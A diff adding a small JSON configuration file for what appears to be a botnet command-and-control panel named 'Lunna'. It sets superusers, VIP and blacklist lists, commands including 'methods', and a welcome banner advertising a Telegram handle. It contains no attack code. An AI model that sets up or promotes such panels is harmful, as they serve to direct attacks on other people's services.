@@ -1,0 +1,15 @@
+{
+	"security_level": 0,
+	"cnc_name": "Lunna",
+	"cnc_motd": "[<&spinner>] uptime: <&cnc.uptime> | Welcome to <&cnc.name> | [<&user.running>/<&user.concurrents>] | @lunnac2 On telegram UWU",
+	"superusers": [
+		"root"
+	],
+	"vips": [],
+	"commands": [
+		"methods",
+		"help",
+		"banner"
+	],
+	"blacklist": []
+}
